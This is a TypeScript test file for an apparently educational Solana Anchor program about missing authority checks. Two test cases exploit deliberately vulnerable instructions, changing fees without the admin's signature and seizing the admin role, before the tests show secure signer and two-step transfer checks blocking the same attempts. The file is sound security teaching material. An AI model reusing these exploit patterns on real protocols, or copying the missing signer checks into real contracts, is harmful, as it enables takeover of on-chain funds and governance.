import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { 
    Keypair, 
    PublicKey, 
    SystemProgram, 
    LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { expect } from "chai";

describe("02_missing_authority_check", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const program = anchor.workspace.MissingAuthorityCheck as Program<any>;
    
    // Test accounts
    let legitimateAdmin: Keypair;
    let attacker: Keypair;
    let configPda: PublicKey;
    let configBump: number;

    const INITIAL_FEE_BPS = 100; // 1%

    before(async () => {
        legitimateAdmin = Keypair.generate();
        attacker = Keypair.generate();

        // Airdrop SOL
        const airdropAdmin = await provider.connection.requestAirdrop(
            legitimateAdmin.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAdmin);

        const airdropAttacker = await provider.connection.requestAirdrop(
            attacker.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAttacker);

        // Derive config PDA
        [configPda, configBump] = PublicKey.findProgramAddressSync(
            [Buffer.from("config")],
            program.programId
        );
    });

    describe("Setup: Initialize protocol configuration", () => {
        it("Legitimate admin initializes the protocol", async () => {
            await program.methods
                .initialize(INITIAL_FEE_BPS)
                .accounts({
                    config: configPda,
                    admin: legitimateAdmin.publicKey,
                    systemProgram: SystemProgram.programId,
                })
                .signers([legitimateAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            expect(config.admin.toString()).to.equal(legitimateAdmin.publicKey.toString());
            expect(config.feeBps).to.equal(INITIAL_FEE_BPS);
            expect(config.isPaused).to.be.false;

            console.log(`âœ… Protocol initialized`);
            console.log(`   Admin: ${config.admin}`);
            console.log(`   Fee: ${config.feeBps} bps`);
        });
    });

    describe("âš ï¸  EXPLOIT 1: Attacker changes fee via vulnerable_update_fee", () => {
        /**
         * ATTACK EXPLANATION:
         * 
         * The vulnerable_update_fee instruction checks:
         *   require!(config.admin == ctx.accounts.new_admin.key(), ...)
         * 
         * But it doesn't verify that new_admin is a SIGNER!
         * 
         * The attacker exploits this by:
         * 1. Passing the legitimate admin's pubkey as new_admin (satisfies the check)
         * 2. Signing the transaction themselves as caller
         * 3. The admin never authorized this, but the check passes!
         * 
         * This mirrors the Solend attack where UpdateReserveConfig was exploited.
         */
        
        it("âŒ EXPLOIT SUCCEEDS: Attacker changes fee without admin signature", async () => {
            const maliciousFee = 999; // 9.99% - very high fee
            
            console.log(`\nğŸ¯ Attack: Change fee from ${INITIAL_FEE_BPS} to ${maliciousFee} bps`);
            console.log(`   Legitimate admin: ${legitimateAdmin.publicKey}`);
            console.log(`   Attacker: ${attacker.publicKey}`);
            
            const configBefore = await program.account.config.fetch(configPda);
            console.log(`   Fee before: ${configBefore.feeBps} bps`);

            // The attack: pass admin's pubkey but don't have them sign
            await program.methods
                .vulnerableUpdateFee(maliciousFee)
                .accounts({
                    config: configPda,
                    newAdmin: legitimateAdmin.publicKey, // Admin's pubkey (not signing!)
                    caller: attacker.publicKey,          // Attacker signs instead
                })
                .signers([attacker])  // Only attacker signs!
                .rpc();

            const configAfter = await program.account.config.fetch(configPda);
            
            console.log(`\nğŸš¨ EXPLOIT SUCCEEDED!`);
            console.log(`   Fee after: ${configAfter.feeBps} bps`);
            console.log(`   Admin never signed this transaction!`);
            
            expect(configAfter.feeBps).to.equal(maliciousFee);
        });
    });

    describe("âš ï¸  EXPLOIT 2: Attacker becomes admin via vulnerable_transfer_admin", () => {
        /**
         * ATTACK EXPLANATION:
         * 
         * The vulnerable_transfer_admin instruction has NO authority check at all.
         * Anyone who calls it becomes the new admin immediately.
         * 
         * This is catastrophic because:
         * 1. Attacker gains full control of the protocol
         * 2. Can drain funds, pause operations, change all parameters
         * 3. Original admin loses all access permanently
         * 
         * This mirrors the Audius exploit where governance was hijacked.
         */
        
        it("âŒ EXPLOIT SUCCEEDS: Attacker becomes admin without authorization", async () => {
            console.log(`\nğŸ¯ Attack: Take over admin role`);
            
            const configBefore = await program.account.config.fetch(configPda);
            console.log(`   Current admin: ${configBefore.admin}`);
            console.log(`   Attacker: ${attacker.publicKey}`);

            // The attack: just call the function as anyone
            await program.methods
                .vulnerableTransferAdmin(attacker.publicKey)
                .accounts({
                    config: configPda,
                    caller: attacker.publicKey,
                })
                .signers([attacker])
                .rpc();

            const configAfter = await program.account.config.fetch(configPda);
            
            console.log(`\nğŸš¨ CRITICAL EXPLOIT SUCCEEDED!`);
            console.log(`   New admin: ${configAfter.admin}`);
            console.log(`   Attacker now controls the entire protocol!`);
            
            expect(configAfter.admin.toString()).to.equal(attacker.publicKey.toString());
        });

        it("Now attacker can do anything - pause protocol, drain funds, etc.", async () => {
            // Attacker is now admin, they can do whatever they want
            // Reset admin back to legitimate for further tests
            await program.methods
                .vulnerableTransferAdmin(legitimateAdmin.publicKey)
                .accounts({
                    config: configPda,
                    caller: attacker.publicKey,
                })
                .signers([attacker])
                .rpc();

            console.log(`ğŸ”§ Reset admin for further testing`);
        });
    });

    describe("âœ… SECURE: Attacker cannot exploit secure_update_fee", () => {
        it("âŒ Attacker cannot change fee (not a signer)", async () => {
            try {
                await program.methods
                    .secureUpdateFee(500)
                    .accounts({
                        config: configPda,
                        admin: legitimateAdmin.publicKey, // Not signing!
                    })
                    .signers([attacker]) // Wrong signer
                    .rpc();
                
                expect.fail("Should have thrown an error");
            } catch (error: any) {
                console.log(`âœ… Attack blocked: Missing signature from admin`);
                expect(error.message).to.include("unknown signer");
            }
        });

        it("âŒ Attacker cannot change fee even with their own signature", async () => {
            try {
                await program.methods
                    .secureUpdateFee(500)
                    .accounts({
                        config: configPda,
                        admin: attacker.publicKey, // Attacker trying to be admin
                    })
                    .signers([attacker])
                    .rpc();
                
                expect.fail("Should have thrown an error");
            } catch (error: any) {
                console.log(`âœ… Attack blocked: has_one constraint failed`);
                expect(error.toString()).to.include("Unauthorized");
            }
        });

        it("âœ… Legitimate admin can update fee", async () => {
            const newFee = 150; // 1.5%
            
            await program.methods
                .secureUpdateFee(newFee)
                .accounts({
                    config: configPda,
                    admin: legitimateAdmin.publicKey,
                })
                .signers([legitimateAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            console.log(`âœ… Legitimate admin updated fee to ${config.feeBps} bps`);
            expect(config.feeBps).to.equal(newFee);
        });
    });

    describe("âœ… SECURE: Two-step admin transfer prevents takeover", () => {
        let newAdmin: Keypair;

        before(async () => {
            newAdmin = Keypair.generate();
            const airdrop = await provider.connection.requestAirdrop(
                newAdmin.publicKey,
                1 * LAMPORTS_PER_SOL
            );
            await provider.connection.confirmTransaction(airdrop);
        });

        it("âŒ Attacker cannot nominate themselves (not current admin)", async () => {
            try {
                await program.methods
                    .secureNominateAdmin(attacker.publicKey)
                    .accounts({
                        config: configPda,
                        admin: attacker.publicKey,
                    })
                    .signers([attacker])
                    .rpc();
                
                expect.fail("Should have thrown an error");
            } catch (error: any) {
                console.log(`âœ… Attack blocked: Only current admin can nominate`);
                expect(error.toString()).to.include("Unauthorized");
            }
        });

        it("âœ… Current admin nominates new admin", async () => {
            await program.methods
                .secureNominateAdmin(newAdmin.publicKey)
                .accounts({
                    config: configPda,
                    admin: legitimateAdmin.publicKey,
                })
                .signers([legitimateAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            console.log(`âœ… New admin nominated: ${config.pendingAdmin}`);
            expect(config.pendingAdmin?.toString()).to.equal(newAdmin.publicKey.toString());
        });

        it("âŒ Attacker cannot accept (not the pending admin)", async () => {
            try {
                await program.methods
                    .secureAcceptAdmin()
                    .accounts({
                        config: configPda,
                        newAdmin: attacker.publicKey,
                    })
                    .signers([attacker])
                    .rpc();
                
                expect.fail("Should have thrown an error");
            } catch (error: any) {
                console.log(`âœ… Attack blocked: Only pending admin can accept`);
                expect(error.toString()).to.include("NotPendingAdmin");
            }
        });

        it("âœ… Nominated admin accepts and becomes new admin", async () => {
            await program.methods
                .secureAcceptAdmin()
                .accounts({
                    config: configPda,
                    newAdmin: newAdmin.publicKey,
                })
                .signers([newAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            console.log(`âœ… Admin transfer complete: ${config.admin}`);
            expect(config.admin.toString()).to.equal(newAdmin.publicKey.toString());
            expect(config.pendingAdmin).to.be.null;
        });
    });

    describe("ğŸ“Š Security Comparison Summary", () => {
        it("Summary of vulnerable vs secure behavior", () => {
            console.log(`
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    SECURITY COMPARISON SUMMARY                        â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  VULNERABLE (missing signer checks)                                   â•‘
â•‘  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                â•‘
â•‘  âŒ vulnerable_update_fee: Checks pubkey but not signature            â•‘
â•‘     â†’ Attacker passes admin pubkey without their consent              â•‘
â•‘                                                                       â•‘
â•‘  âŒ vulnerable_transfer_admin: No authority check at all              â•‘
â•‘     â†’ Anyone can become admin immediately                             â•‘
â•‘                                                                       â•‘
â•‘  ğŸš¨ RESULT: Complete protocol takeover possible                       â•‘
â•‘                                                                       â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  SECURE (proper signer verification)                                  â•‘
â•‘  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                â•‘
â•‘  âœ… secure_update_fee: has_one + Signer constraints                   â•‘
â•‘     â†’ Only stored admin who signs can update                          â•‘
â•‘                                                                       â•‘
â•‘  âœ… secure_nominate/accept_admin: Two-step process                    â•‘
â•‘     â†’ Current admin nominates, new admin must accept                  â•‘
â•‘     â†’ Prevents accidental transfers and single-tx takeovers           â•‘
â•‘                                                                       â•‘
â•‘  ğŸ›¡ï¸  RESULT: Only authorized parties can perform admin actions        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            `);
        });
    });
});
